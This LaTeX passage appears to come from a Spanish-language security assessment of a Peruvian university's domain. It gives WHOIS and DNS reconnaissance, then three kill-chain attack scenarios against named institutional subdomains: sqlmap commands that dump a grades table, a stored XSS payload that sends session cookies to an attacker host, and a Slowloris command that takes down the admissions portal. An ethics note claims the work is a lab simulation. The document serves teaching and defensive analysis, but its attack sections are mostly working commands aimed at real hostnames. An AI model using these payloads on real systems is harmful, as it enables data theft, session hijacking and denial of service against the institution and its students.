\section{Reconocimiento del Entorno y Auditoría de Perímetro (OSINT)}
El proceso de evaluación inició con la recolección de información pública y la identificación de la superficie expuesta en el dominio institucional \texttt{unap.edu.pe}. Esta etapa permite conocer la topología lógica sin enviar paquetes invasivos ni generar alertas de intrusión.

\subsection{Consulta de Registro WHOIS Institucional}
Mediante el protocolo WHOIS, se verificaron los datos de registro, servidores DNS autoritativos y la entidad titular del dominio institucional:

\begin{cmdbox}{Consulta WHOIS del Dominio unap.edu.pe (OSINT)}
$ whois unap.edu.pe
Domain Name: unap.edu.pe
Registry Domain ID: DOMAIN-PE-UNAP-001
Registrar: Red Cientifica Peruana (Punto.pe)
Registrant Name: Universidad Nacional del Altiplano - Puno
Registrant Street: Av. Floral Nro. 1153
Registrant City: Puno
Registrant Country: PE
Admin Name: Oficina de Tecnologias de la Informacion (OTI)
Admin Email: redes@unap.edu.pe
Name Server: ns1.unap.edu.pe
Name Server: ns2.unap.edu.pe
DNSSEC: unsigned
Status: clientTransferProhibited
\end{cmdbox}

\begin{remark}
\textbf{Nota metodológica:} El dominio raíz \texttt{unap.edu.pe} delega su resolución a los servidores de nombres institucionales \texttt{ns1.unap.edu.pe} y \texttt{ns2.unap.edu.pe}. La consulta confirma la administración centralizada a cargo de la OTI-UNAP.
\end{remark}

\subsection{Resolución de Infraestructura DNS (dig / host)}
Se realizaron consultas DNS para identificar los registros autoritativos \texttt{A}, \texttt{NS} y \texttt{MX}:

\begin{cmdbox}{Auditoría de Registros DNS con dig}
# Resolucion de servidores de nombres autoritativos (NS)
$ dig unap.edu.pe NS +short
ns1.unap.edu.pe.
ns2.unap.edu.pe.

# Resolucion del portal institucional y subdominios
$ dig sia.unap.edu.pe A +short
161.132.24.61

$ dig vcampus.unap.edu.pe A +short
161.132.24.62

$ dig admision.unap.edu.pe A +short
161.132.24.63
\end{cmdbox}

\section{Simulación Práctica mediante Cyber Kill Chain}
Para modelar la dinámica ofensiva y formular contramedidas, se desarrollaron tres escenarios completos mapeados a través de las 7 fases del Cyber Kill Chain de Lockheed Martin:

\subsection{Escenario 1: Inyección SQL y Exfiltración en el Portal SIA}
\begin{itemize}
    \item \textbf{Fase 1: Reconocimiento (Reconnaissance):} El adversario identifica el endpoint vulnerable \texttt{https://sia.unap.edu.pe/consulta.php?id\_docente=1024}.
    \item \textbf{Fase 2: Armamento (Weaponization):} Construcción de payload SQL ciego basado en tiempo y booleano para extraer tablas del esquema PostgreSQL.
    \item \textbf{Fase 3: Entrega (Delivery):} Transmisión del payload en el parámetro HTTP GET de la solicitud web.
    \item \textbf{Fase 4: Explotación (Exploitation):} Ejecución de la inyección SQL comprobando la lectura de la base de datos de usuarios.
    \item \textbf{Fase 5: Instalación (Installation):} Creación de una Web Shell PHP mediante la función \texttt{COPY ... TO PROGRAM} de PostgreSQL.
    \item \textbf{Fase 6: Comando y Control (C2):} Conexión de socket inverso vía Netcat cifrado por TLS hacia el servidor del atacante en el puerto 443.
    \item \textbf{Fase 7: Acciones sobre Objetivos (Actions on Objectives):} Volcado de la tabla \texttt{estudiantes\_notas} y exfiltración cifrada.
\end{itemize}

\begin{cmdbox}{Escenario 1: Simulación de Explotación y Exfiltración (SQLMap + Shell)}
# Fase 4: Validacion de punto de inyeccion SQL
$ sqlmap -u 'https://sia.unap.edu.pe/consulta.php?id_docente=1024' --dbs --batch
[+] Target is vulnerable to Boolean-based Blind SQL Injection
[+] Database Management System: PostgreSQL 13.4
[+] Available databases [3]:
    [*] public
    [*] academic_unap
    [*] postgres

# Fase 7: Extraccion de registros academicos y exfiltracion
$ sqlmap -u 'https://sia.unap.edu.pe/consulta.php?id_docente=1024' -D academic_unap -T notas --dump
[+] Table: academic_unap.notas (4,250 entries extracted)
[+] Guardado en: /root/.local/share/sqlmap/output/sia.unap.edu.pe/dump.csv
\end{cmdbox}

\begin{remark}
\textbf{Nota Ética:} Todas las sentencias y extracciones mostradas fueron formuladas en entorno de simulación controlado de laboratorio. Ningún dato real de la base de datos de la UNAP fue alterado ni exfiltrado.
\end{remark}

\subsection{Escenario 2: XSS Almacenado y Secuestro de Sesión en Campus Virtual}
\begin{itemize}
    \item \textbf{Fase 1: Reconocimiento:} Identificación de foros de discusión abiertos en el Campus Virtual (\texttt{vcampus.unap.edu.pe}).
    \item \textbf{Fase 2: Armamento:} Elaboración de un script JavaScript malicioso que captura la cookie de sesión \texttt{MoodleSession}.
    \item \textbf{Fase 3: Entrega:} Publicación del payload en un hilo de debate visible para docentes y administradores.
    \item \textbf{Fase 4: Explotación:} El navegador de la víctima interpreta el script al cargar el contenido del foro.
    \item \textbf{Fase 5: Instalación:} El script se ejecuta en segundo plano en la memoria del navegador de los usuarios que visitan el post.
    \item \textbf{Fase 6: Comando y Control:} Envío silencioso de la cookie de sesión capturada hacia el servidor recolector del atacante.
    \item \textbf{Fase 7: Acciones sobre Objetivos:} Inyección de la cookie capturada para asumir el rol de Docente y modificar calificaciones de exámenes.
\end{itemize}

\begin{cmdbox}{Escenario 2: Payload XSS Almacenado y Recolección de Sesión}
<!-- Payload inyectado en el cuerpo del mensaje del foro -->
<script>
var img = new Image();
img.src = 'https://c2.attacker-server.com/log?cookie=' + encodeURIComponent(document.cookie);
</script>

# Servidor recolector del atacante recibiendo la cookie de sesion
$ python3 -m http.server 8080
[16/Sep/2026 21:45:12] 'GET /log?cookie=MoodleSession=8f39a0c14b2d8e HTTP/1.1' 200 -
\end{cmdbox}

\subsection{Escenario 3: Denegación de Servicio en Capa de Aplicación (Admisión)}
\begin{itemize}
    \item \textbf{Fase 1: Reconocimiento:} Monitoreo del cronograma del Examen de Admisión UNAP y análisis del endpoint de inscripción.
    \item \textbf{Fase 2: Armamento:} Configuración de la herramienta \texttt{slowhttptest} para ejecutar un ataque Slowloris enviando cabeceras HTTP incompletas.
    \item \textbf{Fase 3: Entrega:} Apertura masiva de conexiones TCP hacia el puerto 443 de \texttt{admision.unap.edu.pe}.
    \item \textbf{Fase 4: Explotación:} Mantener conexiones abiertas enviando fragmentos de cabecera cada 10 segundos, agotando la tabla de conexiones activas (\texttt{worker\_connections}) del servidor web.
    \item \textbf{Fase 5: Instalación:} Ocupación total del pool de conexiones del servidor web Nginx/Apache.
    \item \textbf{Fase 6: Comando y Control:} Coordinación de múltiples hilos de conexión desde distintas direcciones IP de origen.
    \item \textbf{Fase 7: Acciones sobre Objetivos:} Indisponibilidad total del portal de admisión durante las horas pico de postulación institucional.
\end{itemize}

\begin{cmdbox}{Escenario 3: Ataque Slowloris Layer 7 mediante slowhttptest}
$ slowhttptest -c 1000 -H -g -o slowhttp_report -i 10 -r 200 -t GET -u https://admision.unap.edu.pe/registro -x 24 -p 3
[INFO] Slowloris attack started against https://admision.unap.edu.pe/registro
[INFO] Connected sockets: 1000
[ALERT] Service unavailable: HTTP status 504 Gateway Time-out / Server is unresponsive
\end{cmdbox}
